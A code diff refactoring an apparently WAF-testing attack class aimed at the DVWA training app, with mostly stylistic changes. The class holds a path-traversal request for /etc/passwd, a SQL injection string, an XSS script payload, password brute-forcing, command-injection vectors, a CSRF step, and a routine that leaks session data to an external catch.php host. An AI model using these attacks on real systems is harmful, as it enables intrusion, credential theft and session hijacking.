@@ -73,9 +73,8 @@ class DVWAAttacks:
                 pvect = "non-printable"
         else:
             pvect = vect
-        if xss:
-            if 'http' in pvect:
-                pvect = "non-printable"
+        if xss and 'http' in pvect:
+            pvect = "non-printable"
 
         return pvect
 
@@ -88,7 +87,7 @@ class DVWAAttacks:
     def saveHTML(self):
         fh = vars.getHtmlPath() + self.prefix + vars.getHtmlFileName() + funcs.getTimeStamp() + vars.getHtmlFileExt()
         self.htmlgen.saveHTML(fhandle=fh,keyval=vars.typecount)
-        funcs.attackOutPut(funcs.stepOne, "info", "HTML was written to file: %s" % fh)
+        funcs.attackOutPut(funcs.stepOne, "info", f"HTML was written to file: {fh}")
 
     def writeWafHtml(self, val=""):
         if val:
@@ -141,7 +140,7 @@ class DVWAAttacks:
         # do a path traversal
         try:
             m = hashlib.md5()
-            fp.open(base + "fi/" + "?page=../../../../../../etc/passwd")
+            fp.open(f"{base}fi/?page=../../../../../../etc/passwd")
             m.update(str(fp.response().read()))
             wbs = m.hexdigest()
         except:
@@ -150,7 +149,10 @@ class DVWAAttacks:
         try:
             # do a sqli
             msql = hashlib.md5()
-            tstr = funcs.formSubmit(fp, base + "sqli/", 0, {"id":"blah' OR 1=1"}, sleep=False)
+            tstr = funcs.formSubmit(
+                fp, f"{base}sqli/", 0, {"id": "blah' OR 1=1"}, sleep=False
+            )
+
             msql.update(tstr)
             wbsql = msql.hexdigest()
         except:
@@ -159,7 +161,14 @@ class DVWAAttacks:
         try:
             # do an xss
             mxss = hashlib.md5()
-            tstr = funcs.formSubmit(fp, base + "xss_r/", 0, {"name":"<script>alert('XSS')</script>"}, sleep=False)
+            tstr = funcs.formSubmit(
+                fp,
+                f"{base}xss_r/",
+                0,
+                {"name": "<script>alert('XSS')</script>"},
+                sleep=False,
+            )
+
             mxss.update(tstr)
             wbsxss = mxss.hexdigest()
         except:
@@ -169,22 +178,25 @@ class DVWAAttacks:
             so if this var is not None then we have detected that a
             redirect by a WAF is in place
         """
-        if wbs and wbsql and wbsxss:
-            if wbs == wbsql and wbs == wbsxss and wbsql == wbsxss:
-                self.wafbaseline = wbs
-                return
-        if wbs and wbsql:
-            if wbs == wbsql:
-                self.wafbaseline = wbs
-                return
-        if wbs and wbsxss:
-            if wbs == wbsxss:
-                self.wafbaseline = wbs
-                return
-        if wbsql and wbsxss:
-            if wbsql == wbsxss:
-                self.wafbaseline = wbsql
-                return
+        if (
+            wbs
+            and wbsql
+            and wbsxss
+            and wbs == wbsql
+            and wbs == wbsxss
+            and wbsql == wbsxss
+        ):
+            self.wafbaseline = wbs
+            return
+        if wbs and wbsql and wbs == wbsql:
+            self.wafbaseline = wbs
+            return
+        if wbs and wbsxss and wbs == wbsxss:
+            self.wafbaseline = wbs
+            return
+        if wbsql and wbsxss and wbsql == wbsxss:
+            self.wafbaseline = wbsql
+            return
     # EOF
 
     """
@@ -194,14 +206,13 @@ class DVWAAttacks:
         given request
     """
     def isWAFBaseline(self, chk):
-        if self.wafbaseline:
-            if chk == self.wafbaseline:
-                """
+        if self.wafbaseline and chk == self.wafbaseline:
+            """
                     increase this value because we know there is
                     match against a known response from a WAF
                 """
-                vars.blockedVectors += 1
-                return True
+            vars.blockedVectors += 1
+            return True
 
         return False
     # EOF
@@ -215,8 +226,11 @@ class DVWAAttacks:
             vars.typecount['brute'][0] += 1
 
             if "incorrect" not in resp:
-                funcs.attackOutPut(funcs.stepFive, "discovered", "Found - user: %s, psw: %s" % (user, p))
-                self.bruteArr.append(user + ":" + p)
+                funcs.attackOutPut(
+                    funcs.stepFive, "discovered", f"Found - user: {user}, psw: {p}"
+                )
+
+                self.bruteArr.append(f"{user}:{p}")
                 return
 
     """
@@ -243,14 +257,10 @@ class DVWAAttacks:
         credresp = funcs.doLoginFormDiscovery(targetpage)
 
         # get passes
-        file2 = open(vars.getStaticPath() + "passwdz")
+        file2 = open(f"{vars.getStaticPath()}passwdz")
         lines2 = file2.readlines(1000)
         lines2 = [x.strip() for x in lines2]
 
-
-        #with open('userz') as userz:
-            #for u in userz:
-                #u = u.strip()
 
         #file = open("userz")
         #lines = file.readlines(1000)
@@ -299,10 +309,7 @@ class DVWAAttacks:
         g.join()
         h.join()
 
-        if len(self.bruteArr) > 0:
-            return self.bruteArr
-        else:
-            return None
+        return self.bruteArr if len(self.bruteArr) > 0 else None
     # EOF
 
     """
@@ -361,10 +368,10 @@ class DVWAAttacks:
                 pass
 
             if vars.getUseBrowser():
-                webbrowser.open(vars.getExtUrl() + "catch.php", new=2, autoraise=True)
+                webbrowser.open(f"{vars.getExtUrl()}catch.php", new=2, autoraise=True)
                 funcs.attackOutPut(funcs.stepThree, "step", "A browser window/tab should have opened up with leaked session data in an external page")
             try:
-                response = urllib2.urlopen(vars.getExtUrl() + "catch.php")
+                response = urllib2.urlopen(f"{vars.getExtUrl()}catch.php")
                 if stamp in response:
                     self.htmlgen.writeHtmlTableCell(success=True, attackType="Expose Session",
                                                     target=self.url + self.apppath + "vulnerabilities/xss_r/", vect=encoded)
@@ -374,7 +381,13 @@ class DVWAAttacks:
             except:
                 pass
         except webbrowser.Error:
-            funcs.attackOutPut(funcs.stepFour, "info", "Could not instantiate the browser - check out %s" % vars.getExtUrl() + "catch.php")
+            funcs.attackOutPut(
+                funcs.stepFour,
+                "info",
+                f"Could not instantiate the browser - check out {vars.getExtUrl()}"
+                + "catch.php",
+            )
+
         #################################################################################
         return None
     # EOF
@@ -398,7 +411,7 @@ class DVWAAttacks:
         discattacks = []
         pvect = ""
 
-        with open(vars.getStaticPath() + 'cmdi.txt') as vectorz:
+        with open(f'{vars.getStaticPath()}cmdi.txt') as vectorz:
             # iterate thru vectors
             for p in vectorz:
                 # split vector up based on delimiter :::
@@ -414,28 +427,22 @@ class DVWAAttacks:
 
                 #if not regCmd.search(tstr) or not regPing.search(tstr):
                 # this means the regular page is not the response
-                if cmdsuccessstr not in str(tstr) and not self.isWAFBaseline(bs):
+                if cmdsuccessstr in str(tstr) or self.isWAFBaseline(bs):
+                    vars.typecount['exec'][2] += 1
+                    self.htmlgen.writeHtmlTableCell(success=False, attackType="Exec",
+                                            target=targetpage, vect=pvect)
 
-                    # check for suspected WAF block
-                    if not funcs.isBlock(tstr):
-                        if p not in discattacks:
-                            discattacks.append(p)
-                            vars.typecount['exec'][1] += 1
-                            self.htmlgen.writeHtmlTableCell(success=True, attackType="Exec",
-                                                    target=targetpage, vect=pvect)
-                    else:
-                        vars.typecount['exec'][2] += 1
-                        self.htmlgen.writeHtmlTableCell(success=False, attackType="Exec",
+                elif not funcs.isBlock(tstr):
+                    if p not in discattacks:
+                        discattacks.append(p)
+                        vars.typecount['exec'][1] += 1
+                        self.htmlgen.writeHtmlTableCell(success=True, attackType="Exec",
                                                 target=targetpage, vect=pvect)
                 else:
                     vars.typecount['exec'][2] += 1
                     self.htmlgen.writeHtmlTableCell(success=False, attackType="Exec",
                                             target=targetpage, vect=pvect)
-
-        if len(discattacks) > 0:
-            return discattacks
-        else:
-            return None
+        return discattacks or None
     # EOF
 
     """
@@ -464,7 +471,15 @@ class DVWAAttacks:
             webbrowser.open(vars.exturl + vars.extpath + "bayshorecsrf.php?token="+base64.b64encode(self.url))
             funcs.attackOutPut(funcs.stepThree, "step", "Check your browser access to the original login with DVWA")
         except webbrowser.Error:
-            funcs.attackOutPut(funcs.stepFour, "info", "Could not instantiate the browser - hit this manually: %s" % vars.exturl + vars.extpath + "bayshorecsrf.php?token="+base64.b64encode(self.url))
+            funcs.attackOutPut(
+                funcs.stepFour,
+                "info",
+                f"Could not instantiate the browser - hit this manually: {vars.exturl}"
+                + vars.extpath
+                + "bayshorecsrf.php?token="
+                + base64.b64encode(self.url),
+            )
+
 
         return "attackcsrf"
     # EOF
@@ -561,26 +576,22 @@ class DVWAAttacks:
 
             tstr = funcs.formSubmit(fp, targetpage, 0, {"id":p}, sleep=False)
             vars.typecount['sqli'][0] += 1
-            if not regErr.search(tstr):
-                if regSQLi.search(tstr):
-                    discattacks.append(p)
-                    #print "\n\n**********SQLi: %s\n\n" % p
-                    vars.typecount['sqli'][1] += 1
-                    self.htmlgen.writeHtmlTableCell(success=True, attackType="SQLi",
-                                            target=targetpage, vect=pvect)
-                else:
-                    vars.typecount['sqli'][2] += 1
-                    self.htmlgen.writeHtmlTableCell(success=False, attackType="SQLi",
-                                            target=targetpage, vect=pvect)
-            else:
+            if regErr.search(tstr):
                 vars.typecount['sqli'][2] += 1
                 self.htmlgen.writeHtmlTableCell(success=False, attackType="SQLi",
                                         target=targetpage, vect=pvect)
 
-        if len(discattacks) > 0:
-            return discattacks
-        else:
-            return None
+            elif regSQLi.search(tstr):
+                discattacks.append(p)
+                #print "\n\n**********SQLi: %s\n\n" % p
+                vars.typecount['sqli'][1] += 1
+                self.htmlgen.writeHtmlTableCell(success=True, attackType="SQLi",
+                                        target=targetpage, vect=pvect)
+            else:
+                vars.typecount['sqli'][2] += 1
+                self.htmlgen.writeHtmlTableCell(success=False, attackType="SQLi",
+                                        target=targetpage, vect=pvect)
+        return discattacks or None
     # EOF
 
     """
